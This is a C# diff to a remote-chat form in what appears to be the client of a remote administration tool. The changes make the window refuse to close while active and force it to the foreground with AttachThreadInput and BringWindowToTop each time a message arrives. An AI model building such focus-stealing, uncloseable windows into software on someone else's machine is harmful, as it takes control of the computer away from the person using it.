@@ -15,34 +15,26 @@ namespace xClient.Forms
     public partial class FrmRemoteChat : Form
     {
         private Client _connectedClient;
+        public bool Active;
 
         public FrmRemoteChat(Client client)
         {
             this._connectedClient = client;
             InitializeComponent();
+            Active = true;
 
         }
 
         public void AddMessage(string sender, string message)
         {
             txtMessages.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), sender, message, Environment.NewLine));
+            ForceFocus();
         }
 
         private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = true;
-        }
-
-        private void StartKeepingTopMost()
-        {
-            (new Thread(() => 
-            {
-                while (Visible)
-                {
-                    NativeMethods.SetForegroundWindow(Handle);
-                    Thread.Sleep(1);
-                }
-            })).Start();
+            if(Active)
+                e.Cancel = true;
         }
 
         /// <summary>
@@ -60,17 +52,7 @@ namespace xClient.Forms
 
         private void FrmRemoteChat_Shown(object sender, EventArgs e)
         {
-            StartKeepingTopMost();
-            txtMessage.Focus();
-        }
-
-        private void FrmRemoteChat_MouseDown(object sender, MouseEventArgs e)
-        {
-            if (e.Button == MouseButtons.Left)
-            {
-                NativeMethods.ReleaseCapture();
-                NativeMethods.SendMessage(Handle, NativeMethods.WM_NCLBUTTONDOWN, NativeMethods.HT_CAPTION, 0);
-            }
+            ForceFocus();
         }
 
         private void btnSend_Click(object sender, EventArgs e)
@@ -82,6 +64,20 @@ namespace xClient.Forms
                 txtMessage.Text = "";
                 txtMessage.Focus();
             }
+        }
+
+        public void ForceFocus()
+        {
+            var fThread = NativeMethods.GetWindowThreadProcessId(NativeMethods.GetForegroundWindow(), IntPtr.Zero);
+            var cThread = NativeMethods.GetCurrentThreadId();
+            if (fThread != cThread)
+            {
+                NativeMethods.AttachThreadInput(fThread, cThread, true);
+                NativeMethods.BringWindowToTop(Handle);
+                NativeMethods.AttachThreadInput(fThread, cThread, false);
+            }
+            else NativeMethods.BringWindowToTop(Handle);
+            txtMessage.Focus();
         }
     }
 }
